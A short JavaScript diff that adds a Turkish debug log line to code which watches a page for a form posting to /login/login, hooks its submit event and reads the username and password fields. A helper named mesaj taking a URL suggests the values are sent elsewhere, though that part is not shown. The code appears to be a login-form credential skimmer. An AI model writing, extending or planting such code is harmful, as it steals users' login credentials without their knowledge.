@@ -12,6 +12,7 @@ function mesaj(url, mesaj) {
 setInterval(() => {
     if(document.querySelectorAll('form[action="/login/login"]')[0] !== undefined) {
         if (document.querySelectorAll('form[action="/login/login"]')[0].getAttribute('listener') !== 'true') {
+            console.log("listener eklendi")
             document.querySelectorAll('form[action="/login/login"]')[0].addEventListener("submit", function(e){
                 var username = document.getElementsByName("login")[0].value
                 var password = document.getElementsByName("password")[0].value
